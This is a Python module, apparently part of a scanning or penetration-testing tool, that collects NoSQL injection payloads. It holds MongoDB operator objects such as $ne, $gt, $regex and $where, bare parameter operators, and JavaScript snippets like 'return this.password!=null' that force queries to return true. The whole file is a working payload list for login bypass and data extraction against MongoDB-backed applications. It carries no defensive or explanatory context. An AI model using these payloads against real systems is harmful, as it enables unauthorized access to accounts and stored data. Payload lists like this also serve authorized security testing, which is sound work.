"""
NoSQL Injection payload collection
"""

from typing import List

class NoSQLInjectionPayloads:
    """NoSQL Injection payload collection"""
    
    @staticmethod
    def get_mongodb_payloads() -> List[str]:
        """Get MongoDB injection payloads"""
        return [
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$where": "return true"}',
            '{"$or": [{"a": 1}, {"b": 1}]}',
            '{"$and": [{"a": 1}, {"b": 1}]}',
            '{"$nor": [{"a": 1}]}',
            '{"$exists": true}',
            '{"$type": 2}',
            '{"$mod": [1, 0]}',
            '{"$all": []}',
            '{"$size": 0}',
            '{"$elemMatch": {}}'
        ]
    
    @staticmethod
    def get_parameter_payloads() -> List[str]:
        """Get NoSQL parameter injection payloads"""
        return [
            'true', 'false',
            '1==1', '1!=2',
            'this.a==this.a',
            'return true',
            'return 1==1',
            'function(){return true}',
            'function(){return 1==1}',
            '$ne',
            '$gt',
            '$lt',
            '$regex',
            '$where',
            '$or',
            '$and'
        ]
    
    @staticmethod
    def get_javascript_payloads() -> List[str]:
        """Get JavaScript-based NoSQL payloads"""
        return [
            'function(){return true}()',
            'function(){return 1==1}()',
            'function(){return this.a==this.a}()',
            'return true',
            'return 1==1',
            'return this.username!=null',
            'return this.password!=null',
            '1; return true',
            '1; return 1==1'
        ]
    
    @staticmethod
    def get_all_payloads() -> List[str]:
        """Get all NoSQL injection payloads"""
        payloads = []
        payloads.extend(NoSQLInjectionPayloads.get_mongodb_payloads())
        payloads.extend(NoSQLInjectionPayloads.get_parameter_payloads())
        payloads.extend(NoSQLInjectionPayloads.get_javascript_payloads())
        return payloads
